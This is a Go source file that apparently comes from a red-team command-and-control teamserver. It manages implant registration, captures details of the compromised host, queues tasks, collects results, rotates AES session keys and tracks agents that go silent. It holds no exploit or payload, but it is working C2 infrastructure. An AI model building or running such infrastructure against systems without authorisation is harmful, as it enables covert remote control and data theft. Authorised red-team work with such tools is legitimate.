package agent

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/redteamleaders/rtlc2/teamserver/internal/crypto"
	"github.com/redteamleaders/rtlc2/teamserver/internal/database"
	log "github.com/sirupsen/logrus"
)

// Manager handles all agent operations.
type Manager struct {
	db       *database.Database
	cipher   *crypto.AESCipher
	agents   map[string]*AgentSession
	mu       sync.RWMutex
	eventsCh chan Event
}

// AgentSession tracks an active agent in memory.
type AgentSession struct {
	Info            *database.AgentRecord
	Tasks           chan *database.TaskRecord
	SessionKey      *crypto.AESCipher
	CheckinCount    int
	LastKeyRotation time.Time
}

// RegistrationRequest is sent by the agent on first check-in.
type RegistrationRequest struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	ProcessName string `json:"process_name"`
	PID         int    `json:"pid"`
	InternalIP  string `json:"internal_ip"`
	Integrity   string `json:"integrity"`
}

// CheckinRequest is sent by the agent on subsequent check-ins.
type CheckinRequest struct {
	AgentID string        `json:"agent_id"`
	Results []TaskOutput  `json:"results,omitempty"`
}

// TaskOutput is the result of a task sent back by the agent.
type TaskOutput struct {
	TaskID string `json:"task_id"`
	Status int    `json:"status"`
	Output []byte `json:"output"`
}

// CheckinResponse is returned to the agent with pending tasks.
type CheckinResponse struct {
	Tasks         []TaskPayload `json:"tasks,omitempty"`
	NewSessionKey string        `json:"new_session_key,omitempty"` // hex key if rotation occurred
}

// TaskPayload is a task to be executed by the agent.
type TaskPayload struct {
	TaskID string            `json:"task_id"`
	Type   int               `json:"type"`
	Data   []byte            `json:"data,omitempty"`
	Params map[string]string `json:"params,omitempty"`
}

// RegistrationResponse is returned to the agent after registration.
type RegistrationResponse struct {
	AgentID    string `json:"agent_id"`
	SessionKey string `json:"session_key"` // hex AES key for this session
}

// Event represents an agent-related event for the event stream.
type Event struct {
	Type      string
	AgentID   string
	Message   string
	Timestamp time.Time
	Data      map[string]string
}

func NewManager(db *database.Database, cipher *crypto.AESCipher) *Manager {
	m := &Manager{
		db:       db,
		cipher:   cipher,
		agents:   make(map[string]*AgentSession),
		eventsCh: make(chan Event, 256),
	}

	// Load existing agents from database
	agents, err := db.GetAllAgents()
	if err == nil {
		for _, a := range agents {
			if a.Alive {
				sessionCipher, _ := crypto.NewAESCipher(a.AESKey)
				m.agents[a.ID] = &AgentSession{
					Info:            a,
					Tasks:           make(chan *database.TaskRecord, 64),
					SessionKey:      sessionCipher,
					CheckinCount:    0,
					LastKeyRotation: time.Now(),
				}
			}
		}
		log.Infof("Loaded %d active agents from database", len(m.agents))
	}

	// Start dead agent checker
	go m.deadAgentChecker()

	return m
}

// Events returns the event channel.
func (m *Manager) Events() <-chan Event {
	return m.eventsCh
}

// Register processes a new agent registration.
func (m *Manager) Register(req *RegistrationRequest, externalIP, listenerID string) (*RegistrationResponse, error) {
	agentID := uuid.New().String()[:8]
	sessionKeyHex, err := crypto.GenerateKey()
	if err != nil {
		return nil, err
	}

	now := time.Now()
	record := &database.AgentRecord{
		ID:            agentID,
		Hostname:      req.Hostname,
		Username:      req.Username,
		OS:            req.OS,
		Arch:          req.Arch,
		ProcessName:   req.ProcessName,
		PID:           req.PID,
		InternalIP:    req.InternalIP,
		ExternalIP:    externalIP,
		SleepInterval: 5,
		Jitter:        10,
		FirstSeen:     now,
		LastSeen:      now,
		ListenerID:    listenerID,
		Integrity:     req.Integrity,
		Alive:         true,
		AESKey:        sessionKeyHex,
	}

	if err := m.db.RegisterAgent(record); err != nil {
		return nil, err
	}

	sessionCipher, _ := crypto.NewAESCipher(sessionKeyHex)
	m.mu.Lock()
	m.agents[agentID] = &AgentSession{
		Info:            record,
		Tasks:           make(chan *database.TaskRecord, 64),
		SessionKey:      sessionCipher,
		CheckinCount:    0,
		LastKeyRotation: time.Now(),
	}
	m.mu.Unlock()

	m.emitEvent("agent_registered", agentID, "New agent registered: "+req.Hostname+" ("+req.Username+")")

	log.WithFields(log.Fields{
		"id":       agentID,
		"hostname": req.Hostname,
		"user":     req.Username,
		"os":       req.OS,
		"ip":       externalIP,
	}).Info("Agent registered")

	return &RegistrationResponse{
		AgentID:    agentID,
		SessionKey: sessionKeyHex,
	}, nil
}

// Checkin processes an agent check-in, stores results, returns pending tasks.
func (m *Manager) Checkin(req *CheckinRequest, externalIP string) (*CheckinResponse, error) {
	m.mu.RLock()
	session, exists := m.agents[req.AgentID]
	m.mu.RUnlock()

	if !exists {
		return nil, ErrAgentNotFound
	}

	// Update last seen
	if err := m.db.UpdateAgentCheckin(req.AgentID, externalIP); err != nil {
		log.Warnf("Failed to update agent checkin: %v", err)
	}
	session.Info.LastSeen = time.Now()
	session.CheckinCount++

	m.emitEvent("agent_checkin", req.AgentID, "Agent checked in: "+session.Info.Hostname)

	// Process task results
	for _, result := range req.Results {
		if result.Status == 2 {
			_ = m.db.SetTaskResult(result.TaskID, result.Output)
		} else if result.Status == 3 {
			_ = m.db.SetTaskError(result.TaskID, result.Output)
		}
		m.emitEvent("task_complete", req.AgentID, "Task completed: "+result.TaskID)
	}

	// Get pending tasks
	pendingTasks, err := m.db.GetPendingTasks(req.AgentID)
	if err != nil {
		return &CheckinResponse{}, nil
	}

	resp := &CheckinResponse{}
	for _, t := range pendingTasks {
		var params map[string]string
		_ = json.Unmarshal([]byte(t.Params), &params)

		resp.Tasks = append(resp.Tasks, TaskPayload{
			TaskID: t.ID,
			Type:   t.Type,
			Data:   t.Data,
			Params: params,
		})
		_ = m.db.UpdateTaskStatus(t.ID, 1) // Mark as running
	}

	// Key rotation: check if rotation is due
	if crypto.RotationDue(session.CheckinCount, session.LastKeyRotation) {
		oldKeyHex := session.Info.AESKey
		oldKeyBytes, decErr := hex.DecodeString(oldKeyHex)
		if decErr == nil {
			salt, saltErr := crypto.GenerateNonce(16)
			if saltErr == nil {
				newKeyBytes, deriveErr := crypto.DeriveNextKey(oldKeyBytes, salt)
				if deriveErr == nil {
					newKeyHex := hex.EncodeToString(newKeyBytes)
					newCipher, cipherErr := crypto.NewAESCipher(newKeyHex)
					if cipherErr == nil {
						// Update session with new key
						session.SessionKey = newCipher
						session.Info.AESKey = newKeyHex
						session.CheckinCount = 0
						session.LastKeyRotation = time.Now()

						// Include the new key in the response for the agent
						resp.NewSessionKey = newKeyHex

						m.emitEvent("key_rotated", req.AgentID,
							fmt.Sprintf("Session key rotated after %d checkins", session.CheckinCount))

						log.WithFields(log.Fields{
							"agent_id": req.AgentID,
						}).Info("Session key rotated")
					}
				}
			}
		}
	}

	return resp, nil
}

// QueueTask queues a task for an agent.
func (m *Manager) QueueTask(agentID string, taskType int, data []byte, params map[string]string) (string, error) {
	m.mu.RLock()
	_, exists := m.agents[agentID]
	m.mu.RUnlock()

	if !exists {
		return "", ErrAgentNotFound
	}

	taskID := uuid.New().String()[:8]
	paramsJSON, _ := json.Marshal(params)

	task := &database.TaskRecord{
		ID:        taskID,
		AgentID:   agentID,
		Type:      taskType,
		Data:      data,
		Params:    string(paramsJSON),
		Status:    0,
		CreatedAt: time.Now(),
	}

	if err := m.db.CreateTask(task); err != nil {
		return "", err
	}

	m.emitEvent("task_queued", agentID, "Task queued: "+taskID)
	return taskID, nil
}

// GetAgent returns an agent by ID.
func (m *Manager) GetAgent(id string) (*database.AgentRecord, error) {
	m.mu.RLock()
	session, exists := m.agents[id]
	m.mu.RUnlock()

	if exists {
		return session.Info, nil
	}
	return m.db.GetAgent(id)
}

// GetAllAgents returns all agents.
func (m *Manager) GetAllAgents() ([]*database.AgentRecord, error) {
	return m.db.GetAllAgents()
}

// RemoveAgent removes an agent.
func (m *Manager) RemoveAgent(id string) error {
	m.mu.Lock()
	delete(m.agents, id)
	m.mu.Unlock()

	m.emitEvent("agent_removed", id, "Agent removed: "+id)
	return m.db.RemoveAgent(id)
}

// GetSessionCipher returns the session cipher for an agent.
func (m *Manager) GetSessionCipher(agentID string) (*crypto.AESCipher, error) {
	m.mu.RLock()
	session, exists := m.agents[agentID]
	m.mu.RUnlock()

	if !exists {
		return nil, ErrAgentNotFound
	}
	return session.SessionKey, nil
}

func (m *Manager) emitEvent(eventType, agentID, message string) {
	select {
	case m.eventsCh <- Event{
		Type:      eventType,
		AgentID:   agentID,
		Message:   message,
		Timestamp: time.Now(),
	}:
	default:
	}
}

// deadAgentChecker marks agents as dead if they haven't checked in for 3x their sleep interval.
func (m *Manager) deadAgentChecker() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		m.mu.RLock()
		for id, session := range m.agents {
			timeout := time.Duration(session.Info.SleepInterval*3) * time.Second
			if timeout < 60*time.Second {
				timeout = 60 * time.Second
			}
			if time.Since(session.Info.LastSeen) > timeout && session.Info.Alive {
				session.Info.Alive = false
				_ = m.db.SetAgentAlive(id, false)
				m.emitEvent("agent_lost", id, "Agent lost: "+session.Info.Hostname)
				log.Warnf("Agent %s (%s) marked as dead", id, session.Info.Hostname)
			}
		}
		m.mu.RUnlock()
	}
}

// Errors
var (
	ErrAgentNotFound = &AgentError{"agent not found"}
)

type AgentError struct {
	msg string
}

func (e *AgentError) Error() string { return e.msg }
